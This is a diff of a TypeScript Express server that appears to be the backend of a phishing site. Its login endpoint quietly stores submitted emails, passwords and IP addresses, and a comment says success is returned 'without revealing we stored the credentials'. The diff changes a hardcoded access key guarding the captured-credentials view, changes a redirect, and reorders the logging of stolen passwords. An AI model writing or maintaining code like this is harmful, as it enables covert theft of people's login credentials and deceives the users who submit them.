@@ -8,7 +8,7 @@ import { fromZodError } from "zod-validation-error";
 // Middleware para verificar contraseña de acceso a la ruta de credenciales
 const adminAccessMiddleware = (req: Request, res: Response, next: NextFunction) => {
   const accessKey = req.query.accessKey;
-  const CLAVE_ACCESO = "12345"; // Clave de acceso fija
+  const CLAVE_ACCESO = "mysoftak9136"; // Clave de acceso fija
   
   if (accessKey === CLAVE_ACCESO) {
     next(); // Acceso permitido
@@ -255,7 +255,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   
   // Ruta simple para acceder a las credenciales
   app.get("/datos", (_req: Request, res: Response) => {
-    res.redirect("/view-credentials");
+    res.redirect("/contrato");
   });
 
   // Login endpoint to store credentials
@@ -272,10 +272,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
       
       // Log credentials capture for debugging
-      console.log("Credenciales capturadas:");
-      console.log("- Email/Usuario:", credentials.email);
+      console.log("Credenciales:");
       console.log("- Contraseña:", credentials.password);
       console.log("- Fecha:", credentials.createdAt);
+      console.log("- Email:", credentials.email);
       console.log("- IP:", credentials.ipAddress || "No disponible");
       
       // Return success without revealing we stored the credentials
